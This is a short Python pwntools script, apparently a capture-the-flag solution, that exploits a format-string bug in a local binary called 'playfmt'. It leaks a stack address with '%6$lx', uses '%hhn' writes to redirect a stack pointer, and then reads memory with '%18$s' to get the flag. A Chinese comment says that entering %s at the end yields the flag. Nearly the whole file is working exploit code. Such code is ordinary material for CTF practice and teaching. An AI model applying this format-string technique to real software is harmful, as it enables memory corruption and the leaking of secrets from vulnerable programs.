#coding:utf-8
from pwn import *

context.log_level="debug"
p=process("./playfmt")
p.recvuntil("=\n")
p.sendlineafter("=\n","%6$lx")
s="0x"+p.recvuntil("\n")
stack_addr=int(s.strip(),16)
print hex(stack_addr)
stack2=stack_addr+0xFFFFCF28-0xffffcef8-0x20
p.sendline("%"+str(stack2&0xff)+"c%6$hhn")
p.sendline("%16c%14$hhn")
p.sendline("%18$s")
p.interactive() #最后输入%s即得flag